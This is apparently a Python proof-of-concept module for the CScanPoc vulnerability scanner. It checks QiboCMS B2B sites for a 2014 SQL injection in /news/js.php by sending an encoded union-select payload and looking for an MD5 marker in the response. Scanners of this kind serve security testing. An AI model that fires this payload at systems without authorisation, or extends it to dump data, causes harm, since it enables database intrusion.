# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0011' # 平台漏洞编号，留空
    name = '齐博CMS B2B SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-03-09'  # 漏洞公布时间
    desc = '''
        齐博CMS B2B /news/js.php?type=like&keyword=123 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = '齐博CMS B2B'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '34a083c5-9dca-4ac0-bd72-9878a222a485'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2014-053187
            payload = '/news/js.php?type=like&keyword=123%%2527%29/**/union/**/select/**/1,concat(0x7e7e7e,md5(1234),0x7e7e7e),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and "81dc9bdb52d04dc20036dbd8313ed055" in r.content:
                #security_hole(url2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
